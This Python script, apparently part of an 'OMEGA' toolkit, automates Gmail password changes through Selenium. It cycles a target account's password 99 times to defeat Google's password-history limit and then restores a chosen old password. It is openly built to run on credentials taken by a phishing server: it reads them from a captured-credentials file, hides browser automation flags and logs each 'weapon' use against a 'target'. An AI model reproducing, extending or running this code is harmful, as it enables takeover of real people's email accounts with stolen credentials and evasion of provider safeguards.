"""
☠️ OMEGA GMAIL PASSWORD CYCLER — PYTHON EDITION ☠️
=================================================
Modern Selenium-based version of the classic VBScript.
Cycles Gmail password 100 times to bypass Google's
password history restriction, then restores old password.

INTEGRATION: Can be called automatically after our
OAuth Phishing Server or Credential Harvester captures
a target's credentials.

USAGE:
    python gmail_password_cycler.py --email target@gmail.com --current PASS123 --old OldPass99
    
    Or with auto-fill from captured credentials:
    python gmail_password_cycler.py --use-captured
"""

import argparse
import json
import os
import sys
import time
import re
from datetime import datetime

# Try importing selenium
try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.common.keys import Keys
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False

# === CONFIG ===
CAPTURED_CREDS_PATH = os.path.join(os.path.dirname(__file__), 'phishing', 'captured_creds.txt')
OMEGA_DIR = os.path.dirname(os.path.abspath(__file__))


class GmailPasswordCycler:
    """Cycle Gmail password 100 times to bypass history restriction."""

    def __init__(self, email, current_password, old_password, headless=True, slow_factor=1):
        self.email = email
        self.current_password = current_password
        self.old_password = old_password
        self.headless = headless
        self.slow_factor = slow_factor
        self.driver = None
        self.base_url = "https://accounts.google.com"
        
        if not SELENIUM_AVAILABLE:
            print("[!] Selenium not installed. Install with: pip install selenium")
            print("[!] Also need ChromeDriver in PATH or use webdriver_manager")
            sys.exit(1)

    def _sleep(self, multiplier=1):
        """Sleep with speed factor applied."""
        time.sleep(0.5 * self.slow_factor * multiplier)

    def _init_driver(self):
        """Initialize Chrome WebDriver."""
        print("[*] Launching Chrome...")
        chrome_options = Options()
        if self.headless:
            chrome_options.add_argument("--headless=new")
        chrome_options.add_argument("--no-sandbox")
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--disable-blink-features=AutomationControlled")
        chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
        chrome_options.add_experimental_option('useAutomationExtension', False)
        
        try:
            from webdriver_manager.chrome import ChromeDriverManager
            service = Service(ChromeDriverManager().install())
            self.driver = webdriver.Chrome(service=service, options=chrome_options)
        except:
            try:
                self.driver = webdriver.Chrome(options=chrome_options)
            except:
                print("[!] ChromeDriver not found. Trying with executable path...")
                chromedriver_paths = [
                    "chromedriver.exe",
                    "C:\\Program Files\\Google\\Chrome\\Application\\chromedriver.exe",
                    "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chromedriver.exe",
                    os.path.join(OMEGA_DIR, "chromedriver.exe"),
                ]
                for path in chromedriver_paths:
                    if os.path.exists(path):
                        service = Service(path)
                        self.driver = webdriver.Chrome(service=service, options=chrome_options)
                        break
                else:
                    print("[!] Could not find ChromeDriver. Install from: https://chromedriver.chromium.org/")
                    sys.exit(1)
        
        self.wait = WebDriverWait(self.driver, 30)
        print("[+] Chrome launched successfully")

    def _login(self, email, password):
        """Log into Google account."""
        print(f"[*] Logging in as {email}...")
        self.driver.get("https://accounts.google.com/Login")
        self._sleep(2)
        
        # Enter email
        try:
            email_field = self.wait.until(
                EC.presence_of_element_located((By.CSS_SELECTOR, 'input[type="email"]'))
            )
            email_field.clear()
            email_field.send_keys(email)
            email_field.send_keys(Keys.RETURN)
            self._sleep(2)
        except Exception as e:
            print(f"[!] Could not find email field: {e}")
            return False
        
        # Enter password
        try:
            pw_field = self.wait.until(
                EC.presence_of_element_located((By.CSS_SELECTOR, 'input[type="password"]'))
            )
            pw_field.clear()
            pw_field.send_keys(password)
            pw_field.send_keys(Keys.RETURN)
            self._sleep(3)
            return True
        except Exception as e:
            print(f"[!] Login failed: {e}")
            return False

    def _change_password(self, current_pw, new_pw):
        """Change password on Google's EditPasswd page."""
        print(f"[*] Changing password...")
        self.driver.get("https://accounts.google.com/b/0/EditPasswd")
        self._sleep(3)
        
        try:
            # Current password field
            cur_field = self.wait.until(
                EC.presence_of_element_located((By.CSS_SELECTOR, 'input[name="oldPassword"]'))
            )
            cur_field.clear()
            cur_field.send_keys(current_pw)
            self._sleep(1)
            
            # New password field
            new_field = self.driver.find_element(By.CSS_SELECTOR, 'input[name="newPassword"]')
            new_field.clear()
            new_field.send_keys(new_pw)
            self._sleep(1)
            
            # Confirm new password
            confirm_field = self.driver.find_element(By.CSS_SELECTOR, 'input[name="confirmNewPassword"]')
            confirm_field.clear()
            confirm_field.send_keys(new_pw)
            self._sleep(1)
            
            # Submit
            confirm_field.send_keys(Keys.RETURN)
            self._sleep(3)
            return True
        except Exception as e:
            print(f"[!] Password change failed: {e}")
            return False

    def _logout(self):
        """Logout from Google."""
        print("[*] Logging out...")
        self.driver.get("https://www.google.com/accounts/Logout")
        self._sleep(2)

    def cycle_passwords(self):
        """Main execution: cycle password 100 times."""
        print("=" * 60)
        print("☠️ OMEGA GMAIL PASSWORD CYCLER ☠️")
        print("=" * 60)
        print(f"  Target:    {self.email}")
        print(f"  Starting:  {self.current_password}")
        print(f"  Restore:   {self.old_password}")
        print(f"  Iterations: 99 + 1 final")
        print("=" * 60)
        
        self._init_driver()
        
        try:
            current = self.current_password
            
            for i in range(1, 100):
                new_pw = f"{self.current_password}{i}"
                print(f"\n[Step {i}/99] {current[:3]}*** -> {new_pw[:3]}***")
                
                if not self._login(self.email, current):
                    print(f"[!] Login failed at step {i}. Aborting.")
                    return False
                
                if not self._change_password(current, new_pw):
                    print(f"[!] Password change failed at step {i}. Aborting.")
                    return False
                
                current = new_pw
                self._logout()
                print(f"[✓] Step {i} complete")
            
            # Final change: restore old password
            print(f"\n[Final Step] Restoring to: {self.old_password[:3]}***")
            if not self._login(self.email, current):
                print("[!] Final login failed.")
                return False
            if not self._change_password(current, self.old_password):
                print("[!] Final password change failed.")
                return False
            self._logout()
            
            print("\n" + "=" * 60)
            print("✅ PASSWORD CYCLE COMPLETE!")
            print(f"  Target: {self.email}")
            print(f"  Password is now: {self.old_password}")
            print("=" * 60)
            
            # Log to weapon usage tracker
            self._log_usage()
            return True
            
        finally:
            if self.driver:
                self.driver.quit()

    def _log_usage(self):
        """Log weapon deployment to audit file."""
        log_path = os.path.join(OMEGA_DIR, "weapons", "weapon_usage.log")
        os.makedirs(os.path.join(OMEGA_DIR, "weapons"), exist_ok=True)
        timestamp = datetime.now().isoformat()
        with open(log_path, 'a') as f:
            f.write(f"[{timestamp}] CYCLER | Target: {self.email} | "
                    f"Restored to: {self.old_password[:3]}***\n")
        print(f"[*] Usage logged to {log_path}")

    @staticmethod
    def get_last_captured_cred():
        """Get the most recently captured credential from phishing server."""
        try:
            if os.path.exists(CAPTURED_CREDS_PATH):
                with open(CAPTURED_CREDS_PATH, 'r') as f:
                    lines = f.readlines()
                if lines:
                    last = lines[-1].strip()
                    # Parse format: [timestamp] Email: xxx | Password: yyy
                    match = re.search(r'Email:\s*(\S+)\s*\|\s*Password:\s*(\S+)', last)
                    if match:
                        return match.group(1), match.group(2)
            return None, None
        except:
            return None, None


def main():
    parser = argparse.ArgumentParser(description="☠️ OMEGA Gmail Password Cycler")
    parser.add_argument('--email', help='Target Gmail address')
    parser.add_argument('--current', help='Current password (known from capture)')
    parser.add_argument('--old', help='Old password to restore to')
    parser.add_argument('--use-captured', action='store_true', 
                       help='Auto-use last captured credential')
    parser.add_argument('--no-headless', action='store_true',
                       help='Show browser window (default: headless)')
    parser.add_argument('--slow', type=int, default=1,
                       help='Slow factor for reliability (default: 1)')
    
    args = parser.parse_args()
    
    email = args.email
    current = args.current
    
    # Auto-use captured credentials
    if args.use_captured:
        email, current = GmailPasswordCycler.get_last_captured_cred()
        if not email or not current:
            print("[!] No captured credentials found!")
            print(f"    Check: {CAPTURED_CREDS_PATH}")
            sys.exit(1)
        print(f"[+] Using captured credential: {email}")
    
    if not all([email, current]):
        parser.print_help()
        print("\n[!] Required: --email --current --old  OR  --use-captured")
        sys.exit(1)
    
    # Get old password to restore
    old_pw = args.old
    if not old_pw:
        old_pw = input("[?] Enter the old password to restore to: ")
    
    cycler = GmailPasswordCycler(
        email=email,
        current_password=current,
        old_password=old_pw,
        headless=not args.no_headless,
        slow_factor=args.slow
    )
    
    success = cycler.cycle_passwords()
    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
